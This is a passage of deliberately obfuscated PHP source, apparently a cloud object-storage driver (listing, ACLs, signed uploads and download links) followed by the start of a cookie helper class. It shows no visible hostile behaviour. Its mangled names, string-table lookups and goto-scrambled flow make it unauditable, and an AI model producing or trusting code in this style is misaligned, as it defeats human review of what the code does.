strtotime($EÇ§Äè”œÜ[$BéˆÒÖ¤[1176]])); } if (isset($FÅ“Ë†ÖŸ[$BéˆÒÖ¤[107]])) { $DªÎÕ›¯Ïñ[$BéˆÒÖ¤[107]] = $FÅ“Ë†ÖŸ[$BéˆÒÖ¤[107]]; } if (isset($FÅ“Ë†ÖŸ[$BéˆÒÖ¤[187]])) { $DªÎÕ›¯Ïñ[$BéˆÒÖ¤[187]] = $FÅ“Ë†ÖŸ[$BéˆÒÖ¤[187]]; } return $DªÎÕ›¯Ïñ; } public function listPath($CßåİØ–á, $CÉ°ôàÖ‹š = false) { $fÚƒ‘æ“Æã =& $_SERVER[í™]; $BæèÃÀğµ‚ = $this->fileList($CßåİØ–á, $fÚƒ‘æ“Æã[8], !0); foreach ($BæèÃÀğµ‚[$fÚƒ‘æ“Æã[74]] as $DŠãóããÃñ => $EÜ“Š«•œƒ) { $BæèÃÀğµ‚[$fÚƒ‘æ“Æã[74]][$DŠãóããÃñ] = $this->folderInfo($EÜ“Š«•œƒ, $EÜ“Š«•œƒ); } foreach ($BæèÃÀğµ‚[$fÚƒ‘æ“Æã[73]] as $DŠãóããÃñ => $EÜ“Š«•œƒ) { $BæèÃÀğµ‚[$fÚƒ‘æ“Æã[73]][$DŠãóããÃñ] = $this->fileInfo($EÜ“Š«•œƒ[$fÚƒ‘æ“Æã[28]], $EÜ“Š«•œƒ); } return $BæèÃÀğµ‚; } public function has($a’ˆáï·, $eëšó®–àŠ = false, $d¸×ª¼ƒŠ = true) { goto d±ƒ½‰å‘Ä; e¥²ïò¿·: $B·ÈŠÆ‚´Ø = $EèîÎˆÄ°[33]; $a…ëîÖæï‹ = 500; $dğÈ‡œš±ù = 0; goto A–Š¬›‚Èù; A–Š¬›‚Èù: $C¶åæ Å‘ = 0; while (!0) { $b‚×¡ìã = array($EèîÎˆÄ°[1167] => $EèîÎˆÄ°[8], $EèîÎˆÄ°[186] => $dïÑí¸’È, $EèîÎˆÄ°[1168] => $a…ëîÖæï‹, $EèîÎˆÄ°[1169] => $B·ÈŠÆ‚´Ø); try { $BõàŸˆØ³” = $this->client->listObjects($this->bucket, $b‚×¡ìã); } catch (OSS\Core\OssException $dÂÓÇ‡„Áñ) { break; } $B·ÈŠÆ‚´Ø = $BõàŸˆØ³”->getNextMarker(); $eÕÇ ¤¦Ï– = $BõàŸˆØ³”->getObjectList(); $D«–éÉ”… = $BõàŸˆØ³”->getPrefixList(); if ($eëšó®–àŠ) { if (count($eÕÇ ¤¦Ï–) > 1 || count($eÕÇ ¤¦Ï–) == 1 && $eÕÇ ¤¦Ï–[0]->getKey() != $dïÑí¸’È) { $dğÈ‡œš±ù += count($eÕÇ ¤¦Ï–) - 1; } if (!empty($D«–éÉ”…)) { $C¶åæ Å‘ += count($D«–éÉ”…); } if ($B·ÈŠÆ‚´Ø === $EèîÎˆÄ°[33]) { break; } continue; } if ($d¸×ª¼ƒŠ) { if (!empty($eÕÇ ¤¦Ï–)) { if (count($eÕÇ ¤¦Ï–) > 1 || $eÕÇ ¤¦Ï–[0]->getKey() != $dïÑí¸’È) { return !0; } } } else { if (!empty($D«–éÉ”…)) { return !0; } } if ($B·ÈŠÆ‚´Ø === $EèîÎˆÄ°[33]) { break; } } if ($eëšó®–àŠ) { return array($EèîÎˆÄ°[191] => $dğÈ‡œš±ù, $EèîÎˆÄ°[192] => $C¶åæ Å‘); } goto BÎª„ù¦­Ó; d±ƒ½‰å‘Ä: $EèîÎˆÄ° =& $_SERVER[í™]; $a’ˆáï· = trim($a’ˆáï·, $EèîÎˆÄ°[8]); $dïÑí¸’È = empty($a’ˆáï·) ? $EèîÎˆÄ°[33] : $a’ˆáï· . $EèîÎˆÄ°[8]; goto e¥²ïò¿·; BÎª„ù¦­Ó: return !1; goto A ŠŒß—³—; A ŠŒß—³—: } public function listAll($bÌÒ¾ÁùÆº) { $D§­½–«Œ =& $_SERVER[í™]; $fèÍöÜùˆ = $this->fileList($bÌÒ¾ÁùÆº, $D§­½–«Œ[33], !0); $C”ÈÊî˜ª = array(); foreach ($fèÍöÜùˆ[$D§­½–«Œ[73]] as $D¼·ù‹‡¤) { $C”ÈÊî˜ª[$D¼·ù‹‡¤[$D§­½–«Œ[28]]] = $D¼·ù‹‡¤[$D§­½–«Œ[77]]; } return $this->listAllFiles($bÌÒ¾ÁùÆº, array_keys($C”ÈÊî˜ª), $C”ÈÊî˜ª); } public function canRead($E¹Å‘Ñã‘ï) { $EÓÉñáÂÏÆ =& $_SERVER[í™]; $bšÉ„º×ëÔ = $this->pathAcl($E¹Å‘Ñã‘ï); return $bšÉ„º×ëÔ == $EÓÉñáÂÏÆ[1180] || $bšÉ„º×ëÔ == $EÓÉñáÂÏÆ[493] ? !0 : !1; } public function canWrite($FĞõíäéÊ¸) { $AÈöÇÁØÅÛ = $this->pathAcl($FĞõíäéÊ¸); return $AÈöÇÁØÅÛ == $_SERVER[í™][493] ? !0 : !1; } public function pathAcl($DÉ®¹êĞä³) { goto CõÃ®”¦¨; AÛØˆ´áÏó: return $BÓ¥õˆ„¬; goto F¾Ö°ªÇ¿º; CõÃ®”¦¨: $aÛóèåˆô‘ =& $_SERVER[í™]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $E¼Ø¼Ú²­Ù = $this->client->getObjectAcl($this->bucket, $this->pathEncode($DÉ®¹êĞä³)); } catch (OSS\Core\OssException $E¥æ£ÔŠÜ´) { return !1; } goto cÎ½¨ì½Ò; cÎ½¨ì½Ò: $BÓ¥õˆ„¬ = $E¼Ø¼Ú²­Ù == $aÛóèåˆô‘[34] ? $this->bucketAcl : $E¼Ø¼Ú²­Ù; if ($BÓ¥õˆ„¬ == $aÛóèåˆô‘[1181]) { return $aÛóèåˆô‘[1180]; } if ($BÓ¥õˆ„¬ == $aÛóèåˆô‘[1182]) { return $aÛóèåˆô‘[493]; } goto AÛØˆ´áÏó; F¾Ö°ªÇ¿º: } private function chmodPath($cƒ™Ëè´í‡, $fùÎ›²‹’­ = '') { $BÃ¸Ó¾ÊÑù =& $_SERVER[í™]; $Fù–Ş»é¿— = empty($fùÎ›²‹’­) ? $BÃ¸Ó¾ÊÑù[1182] : $fùÎ›²‹’­; $f…Â‹Ş¡ = array($BÃ¸Ó¾ÊÑù[34], $BÃ¸Ó¾ÊÑù[185], $BÃ¸Ó¾ÊÑù[1181], $BÃ¸Ó¾ÊÑù[1182]); if (!in_array($Fù–Ş»é¿—, $f…Â‹Ş¡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($cƒ™Ëè´í‡), $Fù–Ş»é¿—); } catch (OSS\Core\OssException $f¿‡¾•¯Ö) { return !1; } return !0; } public function getContent($B·àÂÌÏèî) { return $this->fileSubstr($B·àÂÌÏèî, -1); } public function setContent($b¿ºÇè—, $FøìˆŒåã = '') { $D°§‹ÚË«º =& $_SERVER[í™]; try { $CÔš†¤ññÒ = $this->trafficLimit($D°§‹ÚË«º[1183]); $b½Ó‹âÅ¦Ù = $this->client->putObject($this->bucket, $this->pathEncode($b¿ºÇè—), $FøìˆŒåã, $CÔš†¤ññÒ); } catch (OSS\Core\OssException $bğóº¶í¾é) { return !1; } $E«ğœ±í£ = array($D°§‹ÚË«º[1170] => trim($b½Ó‹âÅ¦Ù[$D°§‹ÚË«º[1184]], $D°§‹ÚË«º[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b¿ºÇè—))); $this->updateObjMeta($b¿ºÇè—, $E«ğœ±í£); return isset($b½Ó‹âÅ¦Ù[$D°§‹ÚË«º[1185]][$D°§‹ÚË«º[1132]]) ? (int) $b½Ó‹âÅ¦Ù[$D°§‹ÚË«º[1185]][$D°§‹ÚË«º[1132]] : strlen($b½Ó‹âÅ¦Ù); } private function updateObjMeta($BÛ¸ôİƒÎ, $c¿”İ»Ú’) { $BÛ¸ôİƒÎ = $this->pathEncode($BÛ¸ôİƒÎ); try { $D“›ƒ¸¨Ù§ = array(OSS\OssClient::OSS_HEADERS => $c¿”İ»Ú’); $this->client->copyObject($this->bucket, $BÛ¸ôİƒÎ, $this->bucket, $BÛ¸ôİƒÎ, $D“›ƒ¸¨Ù§); } catch (OSS\Core\OssException $D„Ú½»î¿·) { return !1; } return !0; } public function upload($d¥ØÌƒÖ™Á, $c¼«‰—Ø­, $FÑ¾ªƒ®Ò = false, $C¨•ƒµˆÀ = REPEAT_REPLACE) { $CƒÚÉŠÙŠ =& $_SERVER[í™]; $eÚ¢”‰¤ÂÎ = trim($d¥ØÌƒÖ™Á, $CƒÚÉŠÙŠ[8]); $BÅö‰îÓ« = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($CƒÚÉŠÙŠ[1170] => @md5_file($c¼«‰—Ø­)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d¥ØÌƒÖ™Á))); $BÅö‰îÓ« = $this->trafficLimit($CƒÚÉŠÙŠ[1183], $BÅö‰îÓ«); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eÚ¢”‰¤ÂÎ), $c¼«‰—Ø­, $BÅö‰îÓ«); } catch (OSS\Core\OssException $EÉŠ†ÁÛà) { return !1; } return $this->getPathOuter($d¥ØÌƒÖ™Á); } public function getHost() { $eÓ®÷¿Òó® =& $_SERVER[í™]; $dÉ·ôºÍï÷ = explode($eÓ®÷¿Òó®[171], parent::getHost()); return $dÉ·ôºÍï÷[0] . $eÓ®÷¿Òó®[171] . $this->bucket . $eÓ®÷¿Òó®[91] . $dÉ·ôºÍï÷[1]; } public function uploadFormData($dõæ¦Á‘¯, $fõà­Õ…’ã = 3600) { goto eìÜ…£İ˜; eãƒİ‚­ğ: $B­ˆ¾äŠİƒ = strpos($aƒ÷²„óæ, $dÕ”šÂªæ¢[284]); $aƒ÷²„óæ = substr($aƒ÷²„óæ, 0, $B­ˆ¾äŠİƒ) . $dÕ”šÂªæ¢[1187]; $E¦‡£×ì÷ã = 1048576000 * 5; goto DÌÑ¿“æåë; eìÜ…£İ˜: $dÕ”šÂªæ¢ =& $_SERVER[í™]; if (!($Aƒ‚³ÜÎ«Û = $this->getHost())) { return !1; } $cŸË —È”È = $fõà­Õ…’ã; goto c‘È­±É; c‘È­±É: $Aƒ«ŸŠùÙ = date($dÕ”šÂªæ¢[1186], time() + $cŸË —È”È); $e§Ìğ™’Æå = new DateTime($Aƒ«ŸŠùÙ); $aƒ÷²„óæ = $e§Ìğ™’Æå->format(DateTime::ISO8601); goto eãƒİ‚­ğ; DÌÑ¿“æåë: $EŞ™íĞöá = $this->pathFather($dõæ¦Á‘¯); $a¥ÄïšË¥ˆ = array($dÕ”šÂªæ¢[1088] => $aƒ÷²„óæ, $dÕ”šÂªæ¢[1089] => array(array($dÕ”šÂªæ¢[1188], 0, $E¦‡£×ì÷ã), array($dÕ”šÂªæ¢[1092], $dÕ”šÂªæ¢[1093], $EŞ™íĞöá))); $BƒÁ Á‰ÌÔ = base64_encode(json_encode($a¥ÄïšË¥ˆ)); goto BÌª¼ˆŒø; BÌª¼ˆŒø: $A‹ƒ§ÑÅ‚Ù = base64_encode(hash_hmac($dÕ”šÂªæ¢[218], $BƒÁ Á‰ÌÔ, $this->secret, !0)); $a¦°œ‹°íá = array($dÕ”šÂªæ¢[1098] => $BƒÁ Á‰ÌÔ, $dÕ”šÂªæ¢[1189] => $this->accessKey, $dÕ”šÂªæ¢[1094] => $dÕ”šÂªæ¢[1086], $dÕ”šÂªæ¢[1190] => $A‹ƒ§ÑÅ‚Ù, $dÕ”šÂªæ¢[169] => $Aƒ‚³ÜÎ«Û); $a¦°œ‹°íá = $this->trafficLimit($dÕ”šÂªæ¢[1183], $a¦°œ‹°íá); goto c»–”ƒ¬©È; c»–”ƒ¬©È: return $a¦°œ‹°íá; goto BããÛ‘ğğ; BããÛ‘ğğ: } public function multiUploadFormData($a£®Ğ¹Ü‘ª, $e²Ğ»Æ¡¸‰ = 3600) { $B ˜Ã‘‡Ù =& $_SERVER[í™]; if (!($Eà™‰®âŒó = $this->getHost())) { return !1; } $B×¹ğ¿”øŞ = $this->trafficLimit($B ˜Ã‘‡Ù[1183]); $Cğƒ½¨óêó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a£®Ğ¹Ü‘ª), $B×¹ğ¿”øŞ); return array($B ˜Ã‘‡Ù[209] => $Cğƒ½¨óêó, $B ˜Ã‘‡Ù[169] => $Eà™‰®âŒó . $B ˜Ã‘‡Ù[8] . $this->pathEncode($a£®Ğ¹Ü‘ª), $B ˜Ã‘‡Ù[210] => gmdate($B ˜Ã‘‡Ù[1191]), $B ˜Ã‘‡Ù[89] => $a£®Ğ¹Ü‘ª); } public function multiUploadAuthData($d… ùÓÛ, $A¢àƒìÀ ˆ = array()) { goto fÆÎš³á›¤; e³½“ó«©È: if (!empty($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[1193]])) { $Då·‚ÌÌÑ = array_merge(array($C«ˆ²ß‰¦÷[4]), $A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[1193]]); sort($Då·‚ÌÌÑ); $C«ˆ²ß‰¦÷[4] = implode($Cõ·½èÑÍ®[217], $Då·‚ÌÌÑ); } $fåí£ÔŒ = implode($Cõ·½èÑÍ®[217], $C«ˆ²ß‰¦÷); $d¢×’ä™Ò = base64_encode(hash_hmac($Cõ·½èÑÍ®[218], $fåí£ÔŒ, $this->secret, !0)); goto eã•ÇÀñª¬; bÊ¤†œŒË¿: $C«ˆ²ß‰¦÷ = array($Cõ·½èÑÍ®[212], $Cõ·½èÑÍ®[33], $Cõ·½èÑÍ®[116], $d–ŞˆŠìª, "\x78\x2d\x6f\x73\163\55\x64\141\164\x65\72{$d–ŞˆŠìª}", $Cõ·½èÑÍ®[8] . $this->bucket . $Cõ·½èÑÍ®[8] . $dØê –š . $B¾°†œ±); if (strpos($B¾°†œ±, $Cõ·½èÑÍ®[213]) === 0) { $C«ˆ²ß‰¦÷[0] = $Cõ·½èÑÍ®[214]; if ($eÚƒÜñŒî = $this->trafficLimit($Cõ·½èÑÍ®[1183])) { $dØê –š = $Cõ·½èÑÍ®[1192]; array_splice($C«ˆ²ß‰¦÷, 5, 0, $dØê –š . $Cõ·½èÑÍ®[4] . $eÚƒÜñŒî[$dØê –š]); } } if (isset($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[215]]) && $A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[215]] == $Cõ·½èÑÍ®[216]) { $C«ˆ²ß‰¦÷[0] = $Cõ·½èÑÍ®[216]; } goto e³½“ó«©È; eã•ÇÀñª¬: $d—¥ÂÒ® = $Cõ·½èÑÍ®[1194] . $this->accessKey . $Cõ·½èÑÍ®[4] . $d¢×’ä™Ò; if (strpos($B¾°†œ±, $Cõ·½èÑÍ®[213]) === 0) { $d—¥ÂÒ® = array($Cõ·½èÑÍ®[220] => $d—¥ÂÒ®, $Cõ·½èÑÍ®[210] => $d–ŞˆŠìª); if ($eÚƒÜñŒî) { $d—¥ÂÒ® = array_merge($d—¥ÂÒ®, $eÚƒÜñŒî); } } return $d—¥ÂÒ®; goto F©¶„ö”; fÆÎš³á›¤: $Cõ·½èÑÍ® =& $_SERVER[í™]; $d–ŞˆŠìª = isset($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[210]]) ? $A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[210]] : gmdate($Cõ·½èÑÍ®[1191]); $B¾°†œ± = isset($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[160]]) ? $A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[160]] : $Cõ·½èÑÍ®[33]; goto eˆèĞ•»‡; eˆèĞ•»‡: $dØê –š = $d… ùÓÛ; if (isset($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[89]])) { $dØê –š = $A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[89]]; unset($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[89]]); } if (isset($A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[211]])) { $A¢àƒìÀ ˆ[$Cõ·½èÑÍ®[210]] = $d–ŞˆŠìª; return $this->listUploadParts($dØê –š, $A¢àƒìÀ ˆ); } goto bÊ¤†œŒË¿; F©¶„ö”: } public function listUploadParts($CÊñ‚•öì¾, $a”¸ºØñö) { goto F‰£ÄÈÑÇŒ; EÃ’ñ¯…ŒÚ: return array($fÕ¬Â¡é³¡[220] => $có¸†¹À¶ù, $fÕ¬Â¡é³¡[210] => $a”¸ºØñö[$fÕ¬Â¡é³¡[210]], $fÕ¬Â¡é³¡[222] => $F³Œµ’Ÿåö); goto dòÒ†×ö¨; dê°´é¸É÷: $bòŒœóöé = $cäÍ’Õõã->getListPart(); $F³Œµ’Ÿåö = array(); foreach ($bòŒœóöé as $D–¤”Ğ… ã) { $F³Œµ’Ÿåö[] = array($fÕ¬Â¡é³¡[1174] => $D–¤”Ğ… ã->getPartNumber(), $fÕ¬Â¡é³¡[1175] => trim($D–¤”Ğ… ã->getETag(), $fÕ¬Â¡é³¡[113])); } goto aˆ‡ÑÚ–Ì“; F‰£ÄÈÑÇŒ: $fÕ¬Â¡é³¡ =& $_SERVER[í™]; $Fó£Å†ñ® = parse_url_query($a”¸ºØñö[$fÕ¬Â¡é³¡[160]]); $cäÍ’Õõã = $this->client->listParts($this->bucket, $this->pathEncode($CÊñ‚•öì¾), $Fó£Å†ñ®[$fÕ¬Â¡é³¡[209]]); goto dê°´é¸É÷; aˆ‡ÑÚ–Ì“: unset($a”¸ºØñö[$fÕ¬Â¡é³¡[211]], $a”¸ºØñö[$fÕ¬Â¡é³¡[215]]); $có¸†¹À¶ù = $this->multiUploadAuthData($CÊñ‚•öì¾, $a”¸ºØñö); if (empty($có¸†¹À¶ù)) { return !1; } goto EÃ’ñ¯…ŒÚ; dòÒ†×ö¨: } public function download($EïÕÚ¤ ‚, $Fõ„Ü“ÔÔ‘) { if ($this->isFolder($EïÕÚ¤ ‚)) { return !1; } try { $dÌ‡š…ëÅ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Fõ„Ü“ÔÔ‘); $dÌ‡š…ëÅ = $this->trafficLimit($_SERVER[í™][105], $dÌ‡š…ëÅ); $this->client->getObject($this->bucket, $this->pathEncode($EïÕÚ¤ ‚), $dÌ‡š…ëÅ); } catch (OSS\Core\OssException $D‰‹Ú¡Î¦) { return !1; } return $Fõ„Ü“ÔÔ‘; } public function fileSubstr($däÌİ¨Ô¿´, $fÕß®“ŸæÕ = 0, $f’Ş‰àà’¨ = false) { if ($fÕß®“ŸæÕ === -1) { $a¤´ø¦Ÿ = array(); } else { if ($f’Ş‰àà’¨ === !1) { $A¡èå‰­½ñ = $this->size($däÌİ¨Ô¿´); } else { $A¡èå‰­½ñ = $fÕß®“ŸæÕ + $f’Ş‰àà’¨ - 1; } $a¤´ø¦Ÿ = array(OSS\OssClient::OSS_RANGE => "{$fÕß®“ŸæÕ}\55{$A¡èå‰­½ñ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($däÌİ¨Ô¿´), $a¤´ø¦Ÿ); } catch (OSS\Core\OssException $C‘Ä÷Ü„¬) { think_exception($C‘Ä÷Ü„¬->getMessage()); return !1; } } private function trafficLimit($Dä·ƒ†ĞÛå, $cÜ«³¤¥÷œ = array()) { goto EÃ¯¡²Ë¸; eíÆ·¨Îé: if (!$a…“È¢×ƒó) { return $cÜ«³¤¥÷œ; } $a…“È¢×ƒó = $a…“È¢×ƒó < 819200 ? 819200 : ($a…“È¢×ƒó > 838860800 ? 838860800 : $a…“È¢×ƒó); $cÜ«³¤¥÷œ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a…“È¢×ƒó); goto dƒ‚¤›Ç”‡; dƒ‚¤›Ç”‡: return $cÜ«³¤¥÷œ; goto F²¦†Äùï; EÃ¯¡²Ë¸: $D‘Üà ùØ =& $_SERVER[í™]; if ($Dä·ƒ†ĞÛå == $D‘Üà ùØ[1183] && $this->isUploadServer() || $Dä·ƒ†ĞÛå == $D‘Üà ùØ[105] && $this->isFileOutServer()) { return $cÜ«³¤¥÷œ; } $a…“È¢×ƒó = floatval($GLOBALS[$D‘Üà ùØ[6]][$D‘Üà ùØ[84]][$D‘Üà ùØ[103]][$Dä·ƒ†ĞÛå]) * 1024 * 1024 * 8; goto eíÆ·¨Îé; F²¦†Äùï: } public function link($a°‰ª¯ÂµÂ, $Cá»éï’µ = array()) { $aåŒÌ“Ëß =& $_SERVER[í™]; if (!$this->exist($a°‰ª¯ÂµÂ) || $this->isFolder($a°‰ª¯ÂµÂ)) { return !1; } try { $Cá»éï’µ = $this->trafficLimit($aåŒÌ“Ëß[105], $Cá»éï’µ); $Aç•¤ÏŒÀ× = $this->client->signUrl($this->bucket, $this->pathEncode($a°‰ª¯ÂµÂ), 3600 * 12, $aåŒÌ“Ëß[216], $Cá»éï’µ); return $this->getCdnLink($Aç•¤ÏŒÀ×); } catch (OSS\Core\OssException $Eç»¡¼Íä¢) { return !1; } } public function fileOut($Cï¤ØÀ›Œ, $FÖ³‡†ÄŠ = false, $AçŸñ˜¡¼ = false, $d‹£­¤âÃ = '') { goto BËÕ®Ä¡ğ; c—†¥Ó½ô: $AçŸñ˜¡¼ = rawurlencode($AçŸñ˜¡¼); $bö§¡‡ˆŸŸ = get_file_mime(get_path_ext($AçŸñ˜¡¼)); if ($bö§¡‡ˆŸŸ == $E³İ¹¼”òš[201]) { return parent::fileOut($Cï¤ØÀ›Œ, $FÖ³‡†ÄŠ, $AçŸñ˜¡¼, $d‹£­¤âÃ); } goto fÑù•»ùåØ; bĞĞ¸§¬äÀ: $b¶Â‹°ˆ»„ = $this->link($Cï¤ØÀ›Œ, $FÃ‰óÎîøƒ); $this->fileOutLink($b¶Â‹°ˆ»„); goto bÌŠéªåùğ; fÑù•»ùåØ: $FÖ³‡†ÄŠ = $FÖ³‡†ÄŠ ? $E³İ¹¼”òš[202] : $E³İ¹¼”òš[203]; $FÃ‰óÎîøƒ = array(OSS\OssClient::OSS_SUB_RESOURCE => $E³İ¹¼”òš[1195] . rawurlencode("{$FÖ³‡†ÄŠ}\x3b\x66\x69\x6c\145\x6e\141\155\x65\x3d{$AçŸñ˜¡¼}")); $FÃ‰óÎîøƒ[OSS\OssClient::OSS_SUB_RESOURCE] .= $E³İ¹¼”òš[1196] . rawurlencode($bö§¡‡ˆŸŸ); goto bĞĞ¸§¬äÀ; BËÕ®Ä¡ğ: $E³İ¹¼”òš =& $_SERVER[í™]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cï¤ØÀ›Œ, $FÖ³‡†ÄŠ, $AçŸñ˜¡¼, $d‹£­¤âÃ); } if (!$AçŸñ˜¡¼) { $AçŸñ˜¡¼ = $this->pathThis($Cï¤ØÀ›Œ); } goto c—†¥Ó½ô; bÌŠéªåùğ: } public function fileOutServer($eÜèŠæŠ«‹, $BšÒÉõøŒ = false, $c¶ÇæŸ‘› = false, $b”äÚÂ¯¤ = '') { parent::fileOut($eÜèŠæŠ«‹, $BšÒÉõøŒ, $c¶ÇæŸ‘›, $b”äÚÂ¯¤); } public function fileOutImage($f‰Ì¤ì—‹, $d†áÉ¯æĞ³ = 250) { $f±õ’ÅÂŒ¡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[í™][1197] . $d†áÉ¯æĞ³); $D¸²ª¢…±« = $this->link($f‰Ì¤ì—‹, $f±õ’ÅÂŒ¡); $this->fileOutLink($D¸²ª¢…±«); } public function fileOutImageServer($bŸŒÙÑ¬, $fÍÑ˜Âß•º = 250) { parent::fileOutImage($bŸŒÙÑ¬, $fÍÑ˜Âß•º); } public function fileOutLink($FîÔç¬”¨) { $A¯¿ÙÃàø‡ =& $_SERVER[í™]; if (!$this->isCdnHost() && substr($FîÔç¬”¨, 0, 7) == $A¯¿ÙÃàø‡[1101]) { $FîÔç¬”¨ = $A¯¿ÙÃàø‡[1102] . substr($FîÔç¬”¨, 7); } header($A¯¿ÙÃàø‡[156] . $FîÔç¬”¨); die; } public function hashMd5($FŒ±ö‘ïË, $aÉ¨«Á‰Ôë = '') { $b•Ñà¿àÂ =& $_SERVER[í™]; $b£Ñ§óˆ‡ = $this->objectMeta($FŒ±ö‘ïË); if (!$b£Ñ§óˆ‡) { return $b•Ñà¿àÂ[33]; } if (!isset($b£Ñ§óˆ‡[$b•Ñà¿àÂ[1170]]) && !empty($aÉ¨«Á‰Ôë)) { $D¸¼ùĞÆã = $this->updateObjMeta($FŒ±ö‘ïË, array($b•Ñà¿àÂ[1170] => $aÉ¨«Á‰Ôë)); $b£Ñ§óˆ‡[$b•Ñà¿àÂ[1170]] = $D¸¼ùĞÆã ? $aÉ¨«Á‰Ôë : $b•Ñà¿àÂ[33]; } return isset($b£Ñ§óˆ‡[$b•Ñà¿àÂ[1170]]) ? strtolower($b£Ñ§óˆ‡[$b•Ñà¿àÂ[1170]]) : $b•Ñà¿àÂ[33]; } public function size($A½¨”Ñ‚³¾) { $Bå·­Çá²° = $this->objectMeta($A½¨”Ñ‚³¾); return $Bå·­Çá²° ? $Bå·­Çá²°[$_SERVER[í™][77]] : 0; } public function info($b¨õö·¶Ê“) { if ($this->isFolder($b¨õö·¶Ê“)) { return $this->folderInfo($b¨õö·¶Ê“); } else { if ($this->isFile($b¨õö·¶Ê“)) { return $this->fileInfo($b¨õö·¶Ê“); } } return !1; } public function exist($fĞãŒç¯à) { return $this->isFile($fĞãŒç¯à) || $this->isFolder($fĞãŒç¯à); } public function isFile($cê¤„›½Çò) { return !$this->isFolder($cê¤„›½Çò) && $this->objectMeta($cê¤„›½Çò); } public function isFolder($A‡•Â®Ïº†) { return $this->cacheMethod($_SERVER[í™][223], $A‡•Â®Ïº†); } protected function objectMeta($e–Àæ—ŒÎŸ) { return $this->cacheMethod($_SERVER[í™][224], $e–Àæ—ŒÎŸ); } protected function _objectMeta($F›—Â¬À˜¼) { $bç¦÷Ïá®§ =& $_SERVER[í™]; try { $Bƒ÷‹ø›Œ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($F›—Â¬À˜¼)); } catch (OSS\Core\OssException $c†âßŠà²¥) { $Bƒ÷‹ø›Œ = !1; } if ($Bƒ÷‹ø›Œ) { $Bƒ÷‹ø›Œ[$bç¦÷Ïá®§[77]] = intval($Bƒ÷‹ø›Œ[$bç¦÷Ïá®§[1177]]); } return $Bƒ÷‹ø›Œ; } protected function _isFolder($Fì¨¢ïÄ¸£) { $eÆª¡ß„¡ =& $_SERVER[í™]; if ($Fì¨¢ïÄ¸£ == $eÆª¡ß„¡[33] || $Fì¨¢ïÄ¸£ == $eÆª¡ß„¡[8]) { return !0; } $A¬Ñ¹òÉÅ« = array($eÆª¡ß„¡[1167] => $eÆª¡ß„¡[8], $eÆª¡ß„¡[186] => rtrim($Fì¨¢ïÄ¸£, $eÆª¡ß„¡[8]) . $eÆª¡ß„¡[8], $eÆª¡ß„¡[1168] => 1, $eÆª¡ß„¡[1169] => $eÆª¡ß„¡[33]); $b‹Ò°–Ãœ§ = $this->client->listObjects($this->bucket, $A¬Ñ¹òÉÅ«); if ($b‹Ò°–Ãœ§->getObjectList() || $b‹Ò°–Ãœ§->getPrefixList()) { return !0; } return !1; } } goto Eèİ’ƒØ£ğ; F»—¦ô£Ü‹: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($C„¶´®Ğ”³ = '', $aÓÜ¥Ã×ê = 0) { if (is_string($C„¶´®Ğ”³) && $C„¶´®Ğ”³ != $_SERVER[í™][33]) { $this->prefix = $C„¶´®Ğ”³; } if (is_numeric($aÓÜ¥Ã×ê) && $aÓÜ¥Ã×ê > 0) { $this->expire = $aÓÜ¥Ã×ê; } } public static function getInstance() { static $aÂÕ·‹à½¢; if ($aÂÕ·‹à½¢ === null) { $aÂÕ·‹à½¢ = new self(); } return $aÂÕ·‹à½¢; } private static $sameCookieSet = array(); public static function set($E­ŠŠ¯ø, $Bïßšœ•Ü, $eğßÂ­‚á„ = 0, $f¡÷‹‚šÊ = false, $FÔÈ…çö¶ƒ = false) { goto Cï‰‡Ø®©; Cï‰‡Ø®©: $då•À…±»† =& $_SERVER[í™]; if (!$eğßÂ­‚á„) { $eğßÂ­‚á„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$E­ŠŠ¯ø]) && self::$sameCookieSet[$E­ŠŠ¯ø] == $Bïßšœ•Ü . $eğßÂ­‚á„) { return; } goto Cºç²®§˜ö; Bµ¸µåºîã: setcookie($E­ŠŠ¯ø, $Bïßšœ•Ü, time() + $eğßÂ­‚á„, $då•À…±»†[8] . trim($FÔÈ…çö¶ƒ, $då•À…±»†[8]) . $DÖß¶¡¦, !1, !1, $f¡÷‹‚šÊ); goto AˆïÍÚ™İ‡; Cºç²®§˜ö: self::$sameCookieSet[$E­ŠŠ¯ø] = $Bïßšœ•Ü . $eğßÂ­‚á„; if (!$FÔÈ…çö¶ƒ) { $FÔÈ…çö¶ƒ = str_replace(HOST, $då•À…±»†[33], APP_HOST); $FÔÈ…çö¶ƒ = _get($GLOBALS, $då•À…±»†[782], $FÔÈ…çö¶ƒ); } $DÖß¶¡¦ = $då•À…±»†[33]; goto Bµ¸µåºîã; AˆïÍÚ™İ‡: } public static function setSafe($eÇÃ¿íˆ»Ÿ, $DÎ•‚º÷¿, $F‹É—†á = 0) { self::set($eÇÃ¿íˆ»Ÿ, $DÎ•‚º÷¿, $F‹É—†á, !0); } public static function get($FÓ§Ë´”‚) { return isset($_COOKIE[$FÓ§Ë´”‚]) ? $_COOKIE[$FÓ§Ë´”‚] : !1; } public static function 